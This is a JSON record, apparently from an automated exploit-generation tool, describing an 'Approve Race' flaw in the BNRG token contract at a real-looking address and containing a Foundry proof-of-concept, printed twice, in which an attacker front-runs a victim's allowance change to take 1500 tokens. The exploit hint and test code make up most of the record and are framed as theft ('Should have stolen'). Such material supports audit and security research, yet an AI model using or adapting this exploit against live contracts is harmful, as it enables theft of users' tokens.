@@ -1,0 +1,61 @@
+{
+  "project_id": "Binamon_Energy_Smart_Contract_Audit_Report_-_QuillAudits",
+  "target_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+  "finding_id": 1,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+    "vulnerability_type": "Approve Race",
+    "violation_category": "ECONOMIC",
+    "finding_id": 1,
+    "preconditions": [
+      {
+        "type": "token_balance",
+        "description": "The victim (token owner) must have a sufficient balance of BNRG tokens to approve and transfer",
+        "token_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+        "min_amount": "1"
+      },
+      {
+        "type": "state",
+        "description": "Contract state must be Unlocked or Restricted (not Locked) to allow transfers from non-owner addresses",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+        "victim_contract": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "The approve function is vulnerable to a race condition where an attacker can front-run a victim's approval transaction. 1) Monitor for a victim's approve transaction with amount X. 2) Front-run it with a transferFrom call using an existing allowance Y (where Y < X). 3) The victim's approve transaction then sets allowance to X, overwriting the reduced allowance. 4) Attacker can now transfer both Y and X amounts, effectively getting Y+X tokens instead of just X."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface BNRG {\n    function approve(address delegate, uint256 numTokens) external returns (bool);\n    function allowance(address owner, address delegate) external view returns (uint256);\n    function transferFrom(address owner, address receiver, uint256 numTokens) external returns (bool);\n    function balanceOf(address tokenOwner) external view returns (uint256);\n    function transfer(address receiver, uint256 numTokens) external returns (bool);\n    function owner() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;\n    address attacker = address(this);\n    address victim;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Create a victim address\n        victim = address(0x123);\n        \n        // Label addresses for clarity\n        vm.label(victim, \"Victim\");\n        vm.label(TARGET, \"BNRG Token\");\n        \n        // Get the owner address from the contract\n        BNRG token = BNRG(TARGET);\n        address owner = token.owner();\n        \n        // Impersonate owner to get tokens\n        vm.startPrank(owner);\n        // Transfer some tokens to victim\n        uint256 victimInitialBalance = 2000 * 10**18;\n        token.transfer(victim, victimInitialBalance);\n        vm.stopPrank();\n        \n        // Verify victim has tokens\n        assertEq(token.balanceOf(victim), victimInitialBalance, \"Victim should have initial tokens\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        BNRG token = BNRG(TARGET);\n        uint256 initialBalance = token.balanceOf(address(this));\n        \n        // Step 1: Victim approves attacker for 1000 tokens\n        vm.prank(victim);\n        token.approve(attacker, 1000 * 10**18);\n        \n        // Verify approval\n        assertEq(token.allowance(victim, attacker), 1000 * 10**18, \"Initial approval should be 1000 tokens\");\n        \n        // Step 2: Victim tries to change approval to 500 tokens\n        // We'll front-run this by using the old allowance first\n        \n        // Front-run: Use the old allowance of 1000 tokens before it's changed\n        uint256 attackerInitialBalance = token.balanceOf(attacker);\n        token.transferFrom(victim, attacker, 1000 * 10**18);\n        \n        // Verify we got the first 1000 tokens\n        assertEq(token.balanceOf(attacker), attackerInitialBalance + 1000 * 10**18, \"Should have stolen first 1000 tokens\");\n        \n        // Step 3: Now the victim's approval change goes through\n        vm.prank(victim);\n        token.approve(attacker, 500 * 10**18);\n        \n        // Verify new allowance\n        assertEq(token.allowance(victim, attacker), 500 * 10**18, \"New approval should be 500 tokens\");\n        \n        // Step 4: Use the new allowance\n        uint256 attackerBalanceBeforeSecond = token.balanceOf(attacker);\n        token.transferFrom(victim, attacker, 500 * 10**18);\n        \n        // Verify we got the second 500 tokens\n        assertEq(token.balanceOf(attacker), attackerBalanceBeforeSecond + 500 * 10**18, \"Should have stolen second 500 tokens\");\n        \n        // Total stolen: 1500 tokens\n        uint256 totalStolen = 1500 * 10**18;\n        assertEq(token.balanceOf(attacker), attackerInitialBalance + totalStolen, \"Should have stolen total 1500 tokens\");\n        uint256 finalBalance = token.balanceOf(address(this));\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No ERC20 profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The approve function in BNRG contract doesn't follow the ERC20 standard pattern of requiring allowance to be set to 0 before changing it. This creates a race condition where a spender can front-run an approve transaction to steal tokens. When a victim tries to change an existing approval from amount X to amount Y, the spender can front-run the approval change with a transferFrom to use amount X, and then still have allowance Y after the approval change goes through.",
+      "attack_strategy": "Simulate the approve race condition by: 1) Setting up a victim with tokens, 2) Having victim approve attacker for amount X, 3) Having victim try to change approval to amount Y, 4) Front-running the approval change to use amount X, 5) Then using the new allowance Y.",
+      "step_by_step_plan": "1. Create a victim address and give it tokens. 2. Have victim approve attacker for 1000 tokens. 3. Have victim try to change approval to 500 tokens. 4. Front-run the approval change by calling transferFrom to take 1000 tokens. 5. After approval change, call transferFrom again to take 500 tokens. 6. Total stolen: 1500 tokens.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n}\n\ninterface BNRG {\n    function approve(address delegate, uint256 numTokens) external returns (bool);\n    function allowance(address owner, address delegate) external view returns (uint256);\n    function transferFrom(address owner, address receiver, uint256 numTokens) external returns (bool);\n    function balanceOf(address tokenOwner) external view returns (uint256);\n    function transfer(address receiver, uint256 numTokens) external returns (bool);\n    function owner() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;\n    address attacker = address(this);\n    address victim;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // Create a victim address\n        victim = address(0x123);\n        \n        // Label addresses for clarity\n        vm.label(victim, \"Victim\");\n        vm.label(TARGET, \"BNRG Token\");\n        \n        // Get the owner address from the contract\n        BNRG token = BNRG(TARGET);\n        address owner = token.owner();\n        \n        // Impersonate owner to get tokens\n        vm.startPrank(owner);\n        // Transfer some tokens to victim\n        uint256 victimInitialBalance = 2000 * 10**18;\n        token.transfer(victim, victimInitialBalance);\n        vm.stopPrank();\n        \n        // Verify victim has tokens\n        assertEq(token.balanceOf(victim), victimInitialBalance, \"Victim should have initial tokens\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        BNRG token = BNRG(TARGET);\n        uint256 initialBalance = token.balanceOf(address(this));\n        \n        // Step 1: Victim approves attacker for 1000 tokens\n        vm.prank(victim);\n        token.approve(attacker, 1000 * 10**18);\n        \n        // Verify approval\n        assertEq(token.allowance(victim, attacker), 1000 * 10**18, \"Initial approval should be 1000 tokens\");\n        \n        // Step 2: Victim tries to change approval to 500 tokens\n        // We'll front-run this by using the old allowance first\n        \n        // Front-run: Use the old allowance of 1000 tokens before it's changed\n        uint256 attackerInitialBalance = token.balanceOf(attacker);\n        token.transferFrom(victim, attacker, 1000 * 10**18);\n        \n        // Verify we got the first 1000 tokens\n        assertEq(token.balanceOf(attacker), attackerInitialBalance + 1000 * 10**18, \"Should have stolen first 1000 tokens\");\n        \n        // Step 3: Now the victim's approval change goes through\n        vm.prank(victim);\n        token.approve(attacker, 500 * 10**18);\n        \n        // Verify new allowance\n        assertEq(token.allowance(victim, attacker), 500 * 10**18, \"New approval should be 500 tokens\");\n        \n        // Step 4: Use the new allowance\n        uint256 attackerBalanceBeforeSecond = token.balanceOf(attacker);\n        token.transferFrom(victim, attacker, 500 * 10**18);\n        \n        // Verify we got the second 500 tokens\n        assertEq(token.balanceOf(attacker), attackerBalanceBeforeSecond + 500 * 10**18, \"Should have stolen second 500 tokens\");\n        \n        // Total stolen: 1500 tokens\n        uint256 totalStolen = 1500 * 10**18;\n        assertEq(token.balanceOf(attacker), attackerInitialBalance + totalStolen, \"Should have stolen total 1500 tokens\");\n        uint256 finalBalance = token.balanceOf(address(this));\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No ERC20 profit\");\n    }\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 118.34850311279297,
+      "prompt_tokens": 7421,
+      "completion_tokens": 2528,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 118.35021495819092,
+  "total_prompt_tokens": 7421,
+  "total_completion_tokens": 2528,
+  "total_cost": 0.0
+}
